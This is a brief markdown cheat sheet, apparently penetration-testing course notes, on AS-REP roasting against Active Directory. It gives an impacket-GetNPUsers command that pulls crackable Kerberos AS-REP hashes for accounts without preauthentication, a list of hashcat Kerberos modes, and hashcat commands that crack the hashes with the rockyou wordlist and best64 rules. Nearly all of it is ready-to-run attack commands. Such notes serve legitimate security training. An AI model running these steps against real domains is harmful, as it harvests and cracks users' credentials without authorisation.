---
tags:
---
# GetNPUsers

Queries target domain for users with 'Do not require Kerberos preauthentication' enabled and export their TGTs for cracking ([AS-REP roasting](https://www.youtube.com/watch?v=EVdwnBFtUtQ))

## Capabilities

```bash
# Pull 
impacket-GetNPUsers -request -dc-ip $IP -outputfile hashes.asreproast $DOMAIN/$USER
```

Crack the hash in hashcat

```
kali@kali:~$ hashcat --help | grep -i "Kerberos"
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```

```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

.\hashcat.exe -m 18200 hashes\pen-200\hashes.asreproast wordlists\rockyou.txt -r rules\best64.rule --force
```
